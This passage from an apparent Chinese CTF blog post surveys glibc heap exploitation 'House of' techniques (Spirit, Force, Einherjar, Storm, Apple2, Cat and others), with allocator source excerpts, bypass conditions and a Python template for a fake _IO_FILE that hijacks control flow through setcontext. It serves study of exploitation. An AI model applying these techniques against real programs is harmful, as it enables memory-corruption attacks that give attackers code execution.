`调用`_IO_WOVERFLOW`，而这个`vtable`也是通过`rdi`的偏移再间址访问再偏移取得的。由于`IO_FILE`结构已经被我们劫持，因此寄存器`rdi`中的值是我们伪造的`IO_FILE`，是可以被我们所控制的，因此`rdx`和`rax`都是可以被我们控制的，所以**除了可以控制`rax`为伪造的`_IO_WOVERFLOW`之外，我们还可以控制寄存器`rdx`**。\n\n这样我们就可以**利用`setcontext`来控制程序流程**了，后面无论是走`ROP的orw`还是走`shellcode的orw`都可以得到flag了。\n\n`House of Cat`的模板如下：（具体情况还需要调试修改）\n\n```py\nfake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址\nnext_chain = 0\nfake_IO_FILE=p64(rdi)         #_flags=rdi\nfake_IO_FILE+=p64(0)*7\nfake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)\nfake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=伪造rdx的值 \nfake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)\nfake_IO_FILE = fake_IO_FILE.ljust(0x68, '\\x00')\nfake_IO_FILE += p64(0)  # _chain\nfake_IO_FILE = fake_IO_FILE.ljust(0x88, '\\x00')\nfake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address\nfake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\\x00')\nfake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr\nfake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\\x00')\nfake_IO_FILE += p64(1) #mode=1\nfake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\\x00')\nfake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10 or ...\nfake_IO_FILE +=p64(0)*6\nfake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr,wide_data->vtable\n```\n\n### House of Kiwi\n\nhttps://www.anquanke.com/post/id/235598\n","slug":"House Of XXX","published":1,"updated":"2023-03-17T14:47:34.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf2000h5oud6kd9e38t","content":"<p>堆的进阶利用，各种House层出不穷，但都是在基本的attck的基础上进行的。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"House-of-Spirit\"><a href=\"#House-of-Spirit\" class=\"headerlink\" title=\"House of Spirit\"></a>House of Spirit</h3><p>House of Spirit是一种针对fast bin的利用，通过在目标位置<strong>伪造</strong>fastbin chunk，并让其被释放，从而达到<strong>申请指定地址内存</strong>的目的。</p>\n<p>需要做的就是让目标位置能够被当作一个chunk释放，重点在于<strong>修改指定地址前后的内容使其能绕过free的检测</strong>。</p>\n<p>需要的绕过：</p>\n<ul>\n<li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为 free 时，如果是mmap的chunk，会单独处理。</li>\n<li>fake chunk<strong>地址需要对齐</strong>。</li>\n<li>fake chunk的<strong>size大小需要满足对应的fastbin</strong> 的需求，同时也得<strong>对齐</strong>。</li>\n<li>fake chunk的next chunk的大小<strong>不能小于2 * SIZE_SZ</strong>，同时也<strong>不能大于av-&gt;system_mem</strong> 。</li>\n<li>fake chunk对应的fastbin<strong>链表头部不能是该fake chunk</strong>，即不能构成double free的情况。</li>\n</ul>\n<h3 id=\"House-of-Force\"><a href=\"#House-of-Force\" class=\"headerlink\" title=\"House of Force\"></a>House of Force</h3><p>House of Force是一种针对<strong>top chunk</strong>的利用，当bin中所有的free chunk都不能满足需求时，就会从top chunk中切割，只要切割后top chunk size&gt; MINSIZE，那么就可以切割top chunk分配。</p>\n<p>如果我们能通过一些方法<strong>控制top chunk的size和我们申请的chunk的大小</strong>，那么只要将<strong>top chunk size修改为一个足够大的值</strong>(如-1,unsigned long的最大值)，那么无论多大的size，我们都能分配到，由此实现<strong>任意地址分配</strong>。</p>\n<p>利用条件：</p>\n<ul>\n<li>可以控制top chunk的size</li>\n<li>可以控制申请chunk的大小</li>\n</ul>\n<h3 id=\"House-of-Einherjar\"><a href=\"#House-of-Einherjar\" class=\"headerlink\" title=\"House of Einherjar\"></a>House of Einherjar</h3><p>House of Einherjar是一种针对<strong>后向合并</strong>操作的利用。当一个chunk被释放时，free会首先会利用prev_inuse位检查其物理低地址的chunk是否空闲，如果空闲则会将这两个chunk合并，<strong>利用当前chunk P的指针、prev_size字段和size字段得到新的chunk的地址以及其大小</strong>。</p>\n<p>因此如果我们能<strong>控制prev_size字段和prev_inuse位</strong>，那么我们就可以将新的chunk指向几乎任何位置。而堆溢出、off by one(null)都可以达到这个条件。</p>\n<p>值得注意的是，在合并取出前一个chunk的时候会用到<strong>unlink</strong>，因此需要提前构造好fake chunk来绕过unlink的检查。</p>\n<p>在这里unlink的检查中主要要注意的是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//检查prev_size和size是否一致</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class=\"number\">0</span>))      </span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size&quot;</span>);     </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//检查fd和bk</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))                      </span><br><span class=\"line\">  malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>由于unlink中是利用要取出的chunk P进行验证，因此之后构造fake chunk的next chunk的prev_size即可绕过第一个检查。</p>\n<p>不过无论什么情况，第二个检查则需要构造一下。</p>\n<p>在利用unlink的时候，我们的绕过方式是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(fakeFD+<span class=\"number\">0x18</span>)==P==*(fakeBK+<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"comment\">//等价于(64bit)</span></span><br><span class=\"line\">P-&gt;fd=&amp;P<span class=\"number\">-0x18</span></span><br><span class=\"line\">P-&gt;bk=&amp;P<span class=\"number\">-0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>但在这里我们可能不能获取到P的地址，所以我们换个方式:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P-&gt;fd=P</span><br><span class=\"line\">P-&gt;bk=P</span><br></pre></td></tr></table></figure>\n\n<p>同样可以绕过unlink的检查。</p>\n<p>值得注意的地方：</p>\n<ul>\n<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>\n<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li>\n<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>\n</ul>\n<h3 id=\"House-of-Lore\"><a href=\"#House-of-Lore\" class=\"headerlink\" title=\"House of Lore\"></a>House of Lore</h3><p>House of Lore好像没什么例子，可能比较少见吧。House of Lore可以实现分配任意指定位置的chunk，从而修改任意地址的内存。利用的前提是需要<strong>控制Small Bin Chunk的bk指针</strong>，并且<strong>控制指定位置chunk的fd指针</strong>。</p>\n<p>主要利用的是small bin中的漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class=\"line\">bck = victim-&gt;bk;</span><br><span class=\"line\"><span class=\"comment\">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class=\"line\">  errstr = <span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 设置 victim 对应的 inuse 位</span></span><br><span class=\"line\">set_inuse_bit_at_offset(victim, nb);</span><br><span class=\"line\"><span class=\"comment\">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class=\"line\">bin-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>\n\n<p>当malloc的时候，如果申请的范围在small bin chunk内，且需要从small bin获取空闲的chunk时，会执行上面的语句。我们可以发现，如果我们能控制一个small bin chunk的bk指针指向fake chunk，并控制<strong>fake chunk的fd指向该small bin chunk</strong>来绕过检查，那么就可以将这个fake chunk放入small bin，下一次申请就可以申请到fake chunk1。</p>\n<h3 id=\"House-of-Orange\"><a href=\"#House-of-Orange\" class=\"headerlink\" title=\"House of Orange\"></a>House of Orange</h3><p>House of Orange核心就是<strong>通过漏洞利用获得free的效果</strong>（在没有free的程序中）。</p>\n<p>原理是当前堆的<strong>top chunk尺寸不足</strong>以满足申请分配的大小的时候，<strong>原来的top chunk会被释放并被置入unsorted bin中</strong>，通过这一点可以在没有free函数情况下获取到 unsorted bins。此时会<strong>执行sysmalloc来向系统申请更多的空间</strong>。但是对于堆来说有mmap和brk两种分配方式，我们需要<strong>让堆以brk的形式拓展</strong>，之后原有的top chunk会被置于unsorted bin中。</p>\n<p>为了达到目的，我们伪造top chunk size绕过一些检查。</p>\n<ul>\n<li>伪造的 size 必须要对齐到内存页(0x1000)</li>\n<li>size 要大于 MINSIZE(0x10)</li>\n<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>\n<li>size 的 prev inuse 位必须为 1</li>\n</ul>\n<p>当然malloc申请的size也有要求：malloc 的尺寸不能大于mmp_.mmap_threshold（默认128K）</p>\n<p>top chunk size的对齐，top chunk addr + top chunk size后是一个4K对齐的地址（默认页面大小为4K，以4K对齐），因此伪造的top chunk size也要满足此条件，因此只能在原来的基础上增减4K的倍数。</p>\n<p>House of Orange的进一步利用与IO_FILE有关，后续再说。</p>\n<h3 id=\"House-of-Roman\"><a href=\"#House-of-Roman\" class=\"headerlink\" title=\"House of Roman\"></a>House of Roman</h3><p>House of Roman是fast bin attack和unsorted bin attack的结合。该技术用于bypass ALSR（即使有PIE也依旧有效），利用12-bit的爆破来达到获取shell的目的。且仅仅只需要<strong>一个UAF漏洞以及能创建任意大小的chunk</strong>的情况下就能完成利用。常用在没有泄露的程序中。</p>\n<p>主要步骤为：</p>\n<ol>\n<li><p>利用unsorted bin进行低地址覆盖，利用fastbin attack将fd指向malloc_hook-0x23来获取__malloc_hook（爆破）</p>\n</li>\n<li><p>利用unsorted bin attack修改malloc_hook为main_arena</p>\n</li>\n<li><p>利用之前获得的malloc_hook进行低位覆盖，修改malloc_hook为one_gadget</p>\n</li>\n</ol>\n<h3 id=\"House-of-Rabbit\"><a href=\"#House-of-Rabbit\" class=\"headerlink\" title=\"House of Rabbit\"></a>House of Rabbit</h3><p>一种在fast bin中伪造堆块的技术。其利用的是在进行malloc_consolidate时，fast bin中的堆块合并的过程中没有检查size。</p>\n<p>在chunk释放后，通过修改size构造fake chunk或修改fd指向fake chunk，之后通过malloc一个很大的内存，触发malloc_consolidate，由于这个过程中没有对size进行检查，因此fast bin中的chunk会放到对应的small bin中，伪造的fake chunk就变得合法了，由此可以实现overlapping</p>\n<p>不过需要伪造一下next chunk的prev_inuse=1和next next chunk的prev_inuse=1。</p>\n<h3 id=\"House-of-Corrosion\"><a href=\"#House-of-Corrosion\" class=\"headerlink\" title=\"House of Corrosion\"></a>House of Corrosion</h3><p>House of Corrosion利用了**<code>global_max_fast</code>**这个libc中的全局变量，<code>global_max_fast</code>表示最大的fastbin chunk的大小，默认为<code>0x80</code>，在没有初始化堆的情况下为<code>0</code>。改写<code>globla_max_fast</code>可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。</p>\n<p><code>fastbinsY</code>中有10个元素，存放大小从<code>0x20~0xb0</code>的chunk，当超出该范围的chunk进入<code>fastbinsY</code>时，就会发生<strong>数组越界</strong>。利用此方法我们可以向<code>fastbinsY</code>后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。</p>\n<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>\n<ol>\n<li><p><code>free</code>的利用：</p>\n<p> 利用<code>free</code>将<code>chunk</code>放入<code>fastbinsY</code>时的数组越界。当<code>global_max_fast</code>被修改变大后，更大的<code>chunk</code>被视为<code>fast bin chunk</code>，会被放入<code>fastbinsY</code>，如果大小超出<code>0xb0</code>，就会将后面对应的内存视作<code>fastbinsY</code>的一项放入，表现出的结果就是<strong>将释放的<code>chunk</code>的堆地址写入该内存</strong>。</p>\n<p> 值得注意的是，本质上这次写入是<code>fast bin chunk</code>进入<code>fast bin</code>的结果，因此该<code>chunk</code>的**<code>fd</code>位置会保存该内存处原有的指针，<code>chunk</code>的内容会被清空**。</p>\n</li>\n<li><p><code>malloc</code>的利用：</p>\n<p> <code>malloc</code>时更大的<code>chunk</code>被视作<code>fast bin</code>，因此首先在<code>fastbinsY</code>中对应的<code>fast bin</code>中取出<code>chunk</code>，如果大小超出<code>0xb0</code>，自然就会越界，在后面的内存中取出<code>chunk</code>。取出时，会<strong>判断后面内存中指针对应的<code>chunk</code>的<code>size</code>字段是否符合该<code>fast bin</code>的大小，如果符合则可以取出</strong>。</p>\n</li>\n</ol>\n<h3 id=\"House-of-Storm\"><a href=\"#House-of-Storm\" class=\"headerlink\" title=\"House of  Storm\"></a>House of  Storm</h3><p>House_of_storm 可以<strong>在任意地址写出chunk地址,进而把这个地址的高位当作size,可以进行任意地址分配chunk</strong>，也就是可以造成任意地址写。House_of_storm 虽然危害之大，但是其条件也是非常的苛刻。</p>\n<p>条件：</p>\n<ol>\n<li>glibc版本小于2.30,因为2.30之后加入了检查</li>\n<li>需要攻击者在 large_bin 和 unsorted_bin 中分别布置一个chunk 这两个chunk需要在<strong>归位之后处于同一个 largebin 的index中且 unsorted_bin 中的chunk要比 large_bin 中的大</strong></li>\n<li>unsorted bin中的bk指针要可控</li>\n<li>large bin中的bk和bk_nextsize指针要可控</li>\n</ol>\n<p>漏洞发生在unsorted bin chunk放入large bin的过程中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//unsorted bin attack</span></span><br><span class=\"line\"><span class=\"comment\">//我们控制unsorted_chunk-&gt;bk = fake_chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//unsorted_chunks(av)-&gt;bk = fake_chunk</span></span><br><span class=\"line\">unsorted_chunks(av)-&gt;bk = unsorted_chunk-&gt;bk;</span><br><span class=\"line\"><span class=\"comment\">//fake_chunk+0x10 = unsorted_bin</span></span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks(av);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//放入fast bin的过程中</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> </span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">                \t如果unsorted_chunk-&gt;size 大于 largbin_chunk-&gt;size，</span></span><br><span class=\"line\"><span class=\"comment\">                \t把unsorted_chunk加入到纵向链表中</span></span><br><span class=\"line\"><span class=\"comment\">                \t我们控制</span></span><br><span class=\"line\"><span class=\"comment\">                \tlarge_chunk-&gt;bk = fake_chunk+0x8 </span></span><br><span class=\"line\"><span class=\"comment\">                \tlarge_chunk-&gt;bk_nextsize=fake_chunk-0x18-5\t</span></span><br><span class=\"line\"><span class=\"comment\">                  -5是因为堆地址常常是0x55或者0x56开头的，-5后可以将其写入size位，而0x56的size可以绕过malloc的检查申请出来</span></span><br><span class=\"line\"><span class=\"comment\">                */</span></span><br><span class=\"line\">                </span><br><span class=\"line\">                 </span><br><span class=\"line\">                unsorted_chunk-&gt;fd_nextsize = largbin_chunk;</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\">//unsorted_chunk-&gt;bk_nextsize = fake_chunk-0x18-5</span></span><br><span class=\"line\">                unsorted_chunk-&gt;bk_nextsize = largbin_chunk-&gt;bk_nextsize;</span><br><span class=\"line\">                </span><br><span class=\"line\">                largbin_chunk-&gt;bk_nextsize = unsorted_chunk;</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\">//fake_chunk+0x3 = unsorted_chunk</span></span><br><span class=\"line\">                unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize = unsorted_chunk;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//bck  = fake_chunk+0x8</span></span><br><span class=\"line\">            bck = largbin_chunk-&gt;bk;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">mark_bin(av, unsorted_chunk_index); <span class=\"comment\">//把unsorted_chunk加入到的bin的表示为非空</span></span><br><span class=\"line\"><span class=\"comment\">//把unsorted_chunk加入到large bin的链表中</span></span><br><span class=\"line\"></span><br><span class=\"line\">unsorted_chunk-&gt;bk = bck;</span><br><span class=\"line\">unsorted_chunk-&gt;fd = largbin_chunk;</span><br><span class=\"line\">largbin_chunk-&gt;bk = unsorted_chunk;</span><br><span class=\"line\"><span class=\"comment\">//fake_chunk+0x18 = unsorted_chunk</span></span><br><span class=\"line\">bck-&gt;fd = unsorted_chunk;</span><br></pre></td></tr></table></figure>\n\n<p>具体利用：</p>\n<ol>\n<li>将unsorted bin chunk的bk指向为fake chunk</li>\n<li>将large bin中的bk指针指向fake chunk+0x8，bk_nextsize指向fake chunk-0x18-5（如果target为要写入的目标地址，则fake chunk为target-0x20），来实现victim-&gt;bk_nextsize-&gt;fd_nextsize=victim(实现fake chunk+3=victim) </li>\n<li>通过malloc(0x48)获得fake chunk,借此可以修改target处的内容</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsorted_bin_chunk-&gt;bk=fake_chunk</span><br><span class=\"line\">large_bin_chunk-&gt;bk=fake_chunk+<span class=\"number\">0x8</span></span><br><span class=\"line\">large_bin_chunk-&gt;bk_nextsize=fake_chunk<span class=\"number\">-0x18</span><span class=\"number\">-5</span></span><br></pre></td></tr></table></figure>\n\n<p>其原理相当于利用large bin将一个堆地址写入任意地址，通过堆地址高位的0x56绕过检测，并将该fake chunk链入unsorted bin，从而实现任意地址malloc。</p>\n<h3 id=\"House-of-Kiwi\"><a href=\"#House-of-Kiwi\" class=\"headerlink\" title=\"House of Kiwi\"></a>House of Kiwi</h3><h3 id=\"House-of-Emma\"><a href=\"#House-of-Emma\" class=\"headerlink\" title=\"House of Emma\"></a>House of Emma</h3><h3 id=\"House-of-Pig\"><a href=\"#House-of-Pig\" class=\"headerlink\" title=\"House of Pig\"></a>House of Pig</h3><p>House of Pig 是一个将 Tcache Statsh Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p>\n<p>需要存在 UAF。能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回。</p>\n<p>利用流程为</p>\n<ol>\n<li><p>进行一个 Tcache Stash Unlink+ 攻击，把地址 __free_hook - 0x10 写入 tcache_pthread_struct。由于该攻击要求__free_hook - 0x8 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</p>\n</li>\n<li><p>再进行一个 large bin attack，修改 _IO_list_all 为一个堆地址，然后在该处伪造 _IO_FILE 结构体。</p>\n</li>\n<li><p>通过伪造的结构体触发 _IO_str_overflow getshell。</p>\n</li>\n</ol>\n<h3 id=\"House-of-Banana\"><a href=\"#House-of-Banana\" class=\"headerlink\" title=\"House of Banana\"></a>House of Banana</h3><p>从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了。不过large bin attack仍可以使用，然而从glibc 2.30开始，常规large bin attack方法也被封堵，不过也能使用。</p>\n<h3 id=\"House-of-Apple\"><a href=\"#House-of-Apple\" class=\"headerlink\" title=\"House of  Apple\"></a>House of  Apple</h3><p>House of Apple在仅使用一次<code>largebin attack</code>并限制读写次数的条件下进行<code>FSOP</code>利用，前提均是已经泄露出<code>libc</code>地址和<code>heap</code>地址。</p>\n<p>使用<code>house of apple</code>的条件为：</p>\n<ol>\n<li>程序从<code>main</code>函数返回或能调用<code>exit</code>函数（触发调用链<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</code>)</li>\n<li>能泄露出<code>heap</code>地址和<code>libc</code>地址</li>\n<li>能使用一次<code>largebin attack</code>（FSOP劫持<code>_IO_list_all</code>到伪造的<code>IO_FILE</code>结构体)</li>\n</ol>\n<p>在劫持IO后我们仍可以继续利用某些<code>IO</code>流函数去修改其他地方的值。就离不开<code>IO_FILE</code>的一个成员<code>_wide_data</code>的利用，其在<code>IO_FILE</code>中的偏移是<code>0xa0</code>。通过对伪造<code>_wide_data</code>并将vtable修改为<code>_IO_wstrn_jumps</code>，通过exit函数触发调用链<code>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</code>，实现任意地址写已知（堆）地址（详情见IO_FILE）。</p>\n<p>House of Apple有四种利用思路：</p>\n<ol>\n<li>修改tcache线程变量为已知值，控制tcache bin的分配。</li>\n<li>修改<code>mp_.tcache_bins</code>为很大的值，使得很大的<code>chunk</code>也通过<code>tcachebin</code>去管理。</li>\n<li>修改<code>tls</code>结构体<code>pointer_guard</code>的值为已知值，走House of emma。</li>\n<li>修改<code>global_max_fast</code>全局变量，让大的chunk也能被认为是fast bin chunk。</li>\n</ol>\n<p>可以看到House of Apple主要还是利用<code>_wide_data</code>和<code>_IO_wstrn_jumps</code>中的<code>_IO_OVRFLOW</code>实现<strong>任意地址写已知地址</strong>，用以辅助其他方法劫持程序流。</p>\n<h3 id=\"House-of-Apple2\"><a href=\"#House-of-Apple2\" class=\"headerlink\" title=\"House of  Apple2\"></a>House of  Apple2</h3><p>House of Apple2也是基于劫持<code>_wide_data</code>的利用，与House of Apple的区别在只劫持<code>_wide_data</code>的条件能控制程序的执行流。</p>\n<p>使用<code>house of apple2</code>的条件为：</p>\n<ul>\n<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>\n<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>\n<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li>\n</ul>\n<p>这次主要利用的是<code>_IO_wide_data</code>中的<code>_wide_vtable</code>，这也是一个虚表，某些函数的执行会调用到其中的函数，调用过程如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _IO_WIDE_JUMPS(THIS) \\</span></span><br><span class=\"line\"><span class=\"meta\">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到这里并<strong>没有对vtable的合法性进行检测</strong>。因此，我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>\n<p>利用思路：</p>\n<p>目前在<code>glibc</code>源码中搜索到的<code>_IO_WXXXXX</code>系列函数的调用只有<code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>和<code>_IO_WOVERFLOW</code>。其中<code>_IO_WSETBUF</code>和<code>_IO_WUNDERFLOW</code>目前无法利用或利用困难，其余的均可构造合适的<code>_IO_FILE</code>进行利用。</p>\n<p>（1）利用<code>_IO_wfile_overflow</code>控制程序执行流（走<code>_IO_WDOALLOCATE</code>）</p>\n<p>以下利用的前提是要从<code>_IO_flush_all_lockp</code>执行<code>_IO_overflow(fp)</code>，因此伪造的IO_FILE需要满足以下条件：</p>\n<ol>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n</ol>\n<p>调用链如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wfile_overflow</span><br><span class=\"line\">    _IO_wdoallocbuf</span><br><span class=\"line\">        _IO_WDOALLOCATE</span><br><span class=\"line\">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_wfile_overflow</code>中需要绕过一些检测，使其成功调用<code>_IO_wdoallocbuf</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">wint_t</span> _IO_wfile_overflow (FILE *f, <span class=\"type\">wint_t</span> wch)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class=\"comment\">/* SET ERROR */</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      f-&gt;_flags |= 